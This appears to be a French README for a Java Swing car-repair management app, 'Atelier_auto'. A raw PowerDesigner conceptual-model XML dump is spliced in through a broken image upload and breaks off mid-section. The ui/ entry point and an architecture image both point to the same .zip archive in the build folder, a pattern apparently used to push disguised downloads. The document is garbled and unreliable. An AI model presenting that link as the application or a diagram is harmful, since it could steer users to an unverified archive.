

## Atelier_auto – Gestion des réparations (Java)

Atelier_auto est une application Java Desktop développée avec NetBeans et Swing, permettant la gestion complète des réparations de véhicules.
Le projet suit une architecture proche du MVC, utilise des services pour la logique métier et est connecté à une base de données JDBC

## Architecture du projet


Le projet est organisé en plusieurs couches :

- **app/** : Contient les tests utilitaires de l’application.  
- **connexion/** : Gestion de la connexion à la base de données (JDBC).  
- **dao/** : Accès aux données (CRUD).  
- **entities/** : Classes entités (`Reparation`, `Vehicule`, `Client`).  
- **services/** : Logique métier.  
- **ui/** : Interfaces graphiques Swing et point d’entrée `https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip`.  
- **images/** : Ressources graphiques (icônes, logos…).

- 
<img width="1536" height="1024" alt="Architecture (2)" src="https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip" />



## Fonctionnalités principales

Gestion des clients et de leurs véhicules.

Ajout, modification et suppression de réparations.

Visualisation des réparations en cours et terminées.

Gestion centralisée via une interface graphique intuitive.

Connexion à la base de données pour persistances des données.
## MCD (Modèle Conceptuel de Données)
<img width="914" height="396" alt="image" src="
[Uploading Atelier_auto.mcd<?xml version="1.0" encoding="UTF-8"?>
<?PowerDesigner AppLocale="UTF16" ID="{BFF2BC62-6FE3-4E2F-9F9B-0AEE5C06CD63}" Label="" LastModificationDate="1763417007" Name="Atelier_auto" Objects="35" Symbols="5" Type="{1E597170-9350-11D1-AB3C-0020AF71E433}" signature="CDM_DATA_MODEL_XML" version="15.1.0.2850"?>
<!-- Veuillez ne pas modifier ce fichier -->

<Model xmlns:a="attribute" xmlns:c="collection" xmlns:o="object">

<o:RootObject Id="o1">
<c:Children>
<o:Model Id="o2">
<a:ObjectID>BFF2BC62-6FE3-4E2F-9F9B-0AEE5C06CD63</a:ObjectID>
<a:Name>Atelier_auto</a:Name>
<a:Code>ATELIER_AUTO</a:Code>
<a:CreationDate>1762966085</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763040341</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:PackageOptionsText>[FolderOptions]

[FolderOptions\Conceptual Data Objects]
GenerationCheckModel=Yes
GenerationPath=
GenerationOptions=
GenerationTasks=
GenerationTargets=
GenerationSelections=

[FolderOptions\CheckModel]

[FolderOptions\CheckModel\Package]

[FolderOptions\CheckModel\Package\GenrCircularityYes]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Package\GenrCircularityNo]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Package\ShortcutUniqCode]
CheckSeverity=Yes
FixRequested=No
CheckRequested=No

[FolderOptions\CheckModel\Package\ChildShortcut]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Domaine]

[FolderOptions\CheckModel\Domaine\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Domaine\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Domaine\CheckNumParam]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Domaine\CheckPrecSupLng]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Domaine\CheckUndefDttp]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Domaine\CheckOtherDttp]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Information]

[FolderOptions\CheckModel\Information\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Information\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Information\InfoNotUsed]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Information\InfoUsedSevTime]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Information\InfoDiffDomn]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Information\CheckNumParam]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Information\CheckPrecSupLng]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Information\CheckUndefDttp]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Information\CheckOtherDttp]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité]

[FolderOptions\CheckModel\Entité\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\MaxLen - NAME]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\MaxLen - CODE]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\EnttNoAttrNo]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\EnttNbSerials]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\EnttNoAttrYes]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\EmptyCollYesYes]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\EnttSamePrnt]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\EnttMultInhr]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\EnttSevInhr]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité\PidtfInhrAtt]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité.Attribut d&#39;entité]

[FolderOptions\CheckModel\Entité.Attribut d&#39;entité\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité.Attribut d&#39;entité\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité.Identifiant]

[FolderOptions\CheckModel\Entité.Identifiant\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité.Identifiant\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité.Identifiant\EmptyColl - PENTCOL]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité.Identifiant\CheckIncludeColl - Entt]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Entité.Identifiant\IdtfChildPIdtf]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Relation]

[FolderOptions\CheckModel\Relation\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Relation\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Relation\RlshReflexiveDeptYes]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Relation\RlshReflexiveDeptNo]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Relation\RlshBject]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Relation\RlshMnyMny]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Relation\RlshDepdChild]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association]

[FolderOptions\CheckModel\Association\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association\AsscNbLink]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association\AsscNbIdLink1]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association\AsscNbIdLink2]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association\AsscIdPass]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association\AsscBject]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association\AsscMaxCard]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association\AsscReflex]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Association\AsscMnyMny]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Héritage]

[FolderOptions\CheckModel\Héritage\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Héritage\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Héritage\EmptyColl - CHILDCOL]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Réplication]

[FolderOptions\CheckModel\Réplication\PartialReplication]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Règle de gestion]

[FolderOptions\CheckModel\Règle de gestion\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Règle de gestion\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Règle de gestion\EmptyColl - OBJCOL]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Objet étendu]

[FolderOptions\CheckModel\Objet étendu\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Objet étendu\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Lien étendu]

[FolderOptions\CheckModel\Lien étendu\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Lien étendu\UniqueCode]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Fichier]

[FolderOptions\CheckModel\Fichier\UniqueNom]
CheckSeverity=No
FixRequested=No
CheckRequested=Yes

[FolderOptions\CheckModel\Fichier\CheckPathExists]
CheckSeverity=Yes
FixRequested=No
CheckRequested=Yes</a:PackageOptionsText>
<a:ModelOptionsText>[ModelOptions]

[ModelOptions\Conceptual options]
CaseSensitive=No
DisplayName=Yes
EnableTrans=No
EnableRequirements=No
InfoUnique=Yes
AllowReuse=Yes
InfoAllowReuse=Yes
Notation=2
RlshUnique=Yes
DefaultDttp=
DomnCopyDttp=Yes
DomnCopyChck=No
DomnCopyRule=No
DomnCopyExat=No
DomnCopyMand=No
DttpFullName=Yes

[ModelOptions\Conceptual options\NamingOptionsTemplates]

[ModelOptions\Conceptual options\ClssNamingOptions]

[ModelOptions\Conceptual options\ClssNamingOptions\FILO]

[ModelOptions\Conceptual options\ClssNamingOptions\FILO\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=&quot;\/:*?&lt;&gt;|&quot;
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\FILO\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_. &quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\FRMEOBJ]

[ModelOptions\Conceptual options\ClssNamingOptions\FRMEOBJ\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\FRMEOBJ\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\FRMELNK]

[ModelOptions\Conceptual options\ClssNamingOptions\FRMELNK\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\FRMELNK\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\DefaultClass]

[ModelOptions\Conceptual options\ClssNamingOptions\DefaultClass\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\DefaultClass\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\CDMPCKG]

[ModelOptions\Conceptual options\ClssNamingOptions\CDMPCKG\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\CDMPCKG\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\CDMDOMN]

[ModelOptions\Conceptual options\ClssNamingOptions\CDMDOMN\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\CDMDOMN\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\INFO]

[ModelOptions\Conceptual options\ClssNamingOptions\INFO\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\INFO\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\ENTT]

[ModelOptions\Conceptual options\ClssNamingOptions\ENTT\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\ENTT\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\IDTF]

[ModelOptions\Conceptual options\ClssNamingOptions\IDTF\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\IDTF\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\RLSH]

[ModelOptions\Conceptual options\ClssNamingOptions\RLSH\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\RLSH\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\ASSC]

[ModelOptions\Conceptual options\ClssNamingOptions\ASSC\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\ASSC\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\CDMINHR]

[ModelOptions\Conceptual options\ClssNamingOptions\CDMINHR\Name]
Template=
MaxLen=254
Case=M
ValidChar=
InvldChar=
AllValid=Yes
NoAccent=No
DefaultChar=_
Script=.convert_name(%Name%,&quot;_&quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Conceptual options\ClssNamingOptions\CDMINHR\Code]
Template=
MaxLen=254
Case=U
ValidChar=&#39;a&#39;-&#39;z&#39;,&#39;A&#39;-&#39;Z&#39;,&#39;0&#39;-&#39;9&#39;,&quot;_&quot;
InvldChar=
AllValid=No
NoAccent=Yes
DefaultChar=_
Script=.convert_code(%Code%,&quot; &quot;)
ConvTable=
ConvTablePath=%_HOME%\Fichiers de ressources\Tables de conversion

[ModelOptions\Generate]

[ModelOptions\Generate\Pdm]
CheckModel=Yes
SaveLinks=Yes
NameToCode=No
BuildTrgr=No
TablePrefix=
RefrUpdRule=RESTRICT
RefrDelRule=RESTRICT
IndxPKName=%TABLE%_PK
IndxAKName=%TABLE%_AK
IndxFKName=%REFR%_FK
IndxThreshold=
ClassPrefix=
ColnFKName=%.3:PARENT%_%COLUMN%
ColnFKNameUse=No

[ModelOptions\Generate\Oom]
CheckModel=Yes
SaveLinks=Yes
NameToCode=Yes

[ModelOptions\Generate\Ldm]
CheckModel=Yes
SaveLinks=Yes
NameToCode=No
PreserveMode=Yes</a:ModelOptionsText>
<c:GeneratedModels>
<o:Shortcut Id="o3">
<a:ObjectID>5B8BC58A-1469-4346-B162-592AB1466ABA</a:ObjectID>
<a:Name>Atelier_auto</a:Name>
<a:Code>ATELIER_AUTO</a:Code>
<a:CreationDate>1763040342</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763040342</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:TargetStereotype/>
<a:TargetID>AE6B9916-1C1E-4989-B862-BDC3B7912904</a:TargetID>
<a:TargetClassID>5F45F978-C4F3-4E35-A3FC-AF3318663A0F</a:TargetClassID>
</o:Shortcut>
<o:Shortcut Id="o4">
<a:ObjectID>8A1CE3C1-6057-4C99-BFFE-5BFC719AE5D9</a:ObjectID>
<a:Name>Atelier_auto</a:Name>
<a:Code>ATELIER_AUTO</a:Code>
<a:CreationDate>1763280652</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763280652</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:TargetStereotype/>
<a:TargetID>964F4985-3FEA-490E-9329-A5D187FEDF9F</a:TargetID>
<a:TargetClassID>5F45F978-C4F3-4E35-A3FC-AF3318663A0F</a:TargetClassID>
</o:Shortcut>
</c:GeneratedModels>
<c:ConceptualDiagrams>
<o:ConceptualDiagram Id="o5">
<a:ObjectID>03CF922A-2BDF-40DB-9A89-DFCFE0A22C13</a:ObjectID>
<a:Name>Diagramme_1</a:Name>
<a:Code>DIAGRAMME_1</a:Code>
<a:CreationDate>1762966085</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763038386</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DisplayPreferences>[DisplayPreferences]

[DisplayPreferences\CDM]

[DisplayPreferences\General]
Adjust to text=Yes
Snap Grid=No
Constrain Labels=Yes
Display Grid=No
Show Page Delimiter=Yes
Grid size=0
Graphic unit=2
Window color=255, 255, 255
Background image=
Background mode=8
Watermark image=
Watermark mode=8
Show watermark on screen=No
Gradient mode=0
Gradient end color=255, 255, 255
Show Swimlane=No
SwimlaneVert=Yes
TreeVert=No
CompDark=0

[DisplayPreferences\Object]
Mode=0
Trunc Length=80
Word Length=80
Word Text=!&quot;&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
Shortcut IntIcon=Yes
Shortcut IntLoct=Yes
Shortcut IntFullPath=No
Shortcut IntLastPackage=Yes
Shortcut ExtIcon=Yes
Shortcut ExtLoct=No
Shortcut ExtFullPath=No
Shortcut ExtLastPackage=Yes
Shortcut ExtIncludeModl=Yes
EObjShowStrn=Yes
ExtendedObject.Comment=No
ExtendedObject.IconPicture=No
ExtendedObject_SymbolLayout=
ELnkShowStrn=Yes
ELnkShowName=Yes
ExtendedLink_SymbolLayout=
FileObject.Stereotype=No
FileObject.DisplayName=Yes
FileObject.LocationOrName=No
FileObject.IconPicture=No
FileObject.IconMode=Yes
FileObject_SymbolLayout=
PckgStrn=Yes
Package.Comment=No
Package.IconPicture=No
Package_SymbolLayout=
Display Model Version=Yes
EnttAttr=Yes
PentMode=0
PentNb=5
EnttDttp=Yes
EnttDomn=Yes
EnttShowDomn=No
EnttMand=Yes
EnttCIdf=Yes
EnttKeyI=Yes
PentStrn=Yes
IdtfStrn=Yes
RlshName=Yes
RlshRole=Yes
RlshCard=No
RlshDmnt=Yes
RlshStrn=Yes
InhrName=Yes
InhrStrn=Yes
Entity.IconPicture=No
Entity_SymbolLayout=
Association.IconPicture=No
Association_SymbolLayout=
Inheritance.IconPicture=No
Inheritance_SymbolLayout=
EnttStrn=Yes
EnttCmmt=No
AsscStrn=Yes
AsscCmmt=No
AsscAttr=Yes
AsscDttp=Yes
AsscDomn=Yes
AsscShowDomn=No
AsscMand=Yes
AsscDLim=Yes
AsscNb=5
PassStrn=1
LinkRole=Yes
LinkCard=Yes
LinkStrn=Yes

[DisplayPreferences\Symbol]

[DisplayPreferences\Symbol\FRMEOBJ]
STRNFont=Arial,8,N
STRNFont color=0, 0, 0
DISPNAMEFont=Arial,8,N
DISPNAMEFont color=0, 0, 0
LABLFont=Arial,8,N
LABLFont color=0, 0, 0
AutoAdjustToText=Yes
Keep aspect=No
Keep center=No
Keep size=No
Width=6000
Height=2000
Brush color=255 255 255
Fill Color=Yes
Brush style=6
Brush bitmap mode=12
Brush gradient mode=64
Brush gradient color=192 192 192
Brush background image=
Custom shape=
Custom text mode=0
Pen=1 0 255 128 128
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\FRMELNK]
CENTERFont=Arial,8,N
CENTERFont color=0, 0, 0
Line style=2
AutoAdjustToText=Yes
Keep aspect=No
Keep center=No
Keep size=No
Brush color=255 255 255
Fill Color=Yes
Brush style=1
Brush bitmap mode=12
Brush gradient mode=0
Brush gradient color=118 118 118
Brush background image=
Custom shape=
Custom text mode=0
Pen=1 0 128 128 255
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\FILO]
OBJSTRNFont=Arial,8,N
OBJSTRNFont color=0, 0, 0
DISPNAMEFont=Arial,8,N
DISPNAMEFont color=0, 0, 0
LCNMFont=Arial,8,N
LCNMFont color=0, 0, 0
AutoAdjustToText=Yes
Keep aspect=Yes
Keep center=Yes
Keep size=No
Width=2400
Height=2400
Brush color=255 255 255
Fill Color=No
Brush style=1
Brush bitmap mode=12
Brush gradient mode=0
Brush gradient color=118 118 118
Brush background image=
Custom shape=
Custom text mode=0
Pen=1 0 0 0 255
Shadow color=192 192 192
Shadow=-1

[DisplayPreferences\Symbol\CDMPCKG]
STRNFont=Arial,8,N
STRNFont color=0 0 0
DISPNAMEFont=Arial,8,N
DISPNAMEFont color=0 0 0
LABLFont=Arial,8,N
LABLFont color=0 0 0
AutoAdjustToText=Yes
Keep aspect=No
Keep center=No
Keep size=No
Width=4800
Height=3600
Brush color=255 255 192
Fill Color=Yes
Brush style=6
Brush bitmap mode=12
Brush gradient mode=65
Brush gradient color=255 255 255
Brush background image=
Custom shape=
Custom text mode=0
Pen=1 0 178 178 178
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\ENTT]
STRNFont=Arial,8,N
STRNFont color=0 0 0
DISPNAMEFont=Arial,8,N
DISPNAMEFont color=0 0 0
AttributesFont=Arial,8,N
AttributesFont color=0 0 0
LABLFont=Arial,8,N
LABLFont color=0 0 0
EntityPrimaryAttributeFont=Arial,8,U
EntityPrimaryAttributeFont color=0 0 0
IdentifiersFont=Arial,8,N
IdentifiersFont color=0 0 0
AutoAdjustToText=Yes
Keep aspect=No
Keep center=No
Keep size=No
Width=4800
Height=4000
Brush color=233 202 131
Fill Color=Yes
Brush style=6
Brush bitmap mode=12
Brush gradient mode=65
Brush gradient color=255 255 255
Brush background image=
Custom shape=
Custom text mode=0
Pen=1 0 128 128 64
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\RLSH]
DISPNAMEFont=Arial,8,N
DISPNAMEFont color=0 0 0
NAMAFont=Arial,8,N
NAMAFont color=0 0 0
Line style=2
AutoAdjustToText=Yes
Keep aspect=No
Keep center=No
Keep size=No
Brush color=255 255 255
Fill Color=Yes
Brush style=1
Brush bitmap mode=12
Brush gradient mode=0
Brush gradient color=118 118 118
Brush background image=
Custom shape=
Custom text mode=0
Pen=1 0 128 0 64
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\ASSC]
STRNFont=Arial,8,N
STRNFont color=0, 0, 0
DISPNAMEFont=Arial,8,N
DISPNAMEFont color=0, 0, 0
AttributesFont=Arial,8,N
AttributesFont color=0, 0, 0
LABLFont=Arial,8,N
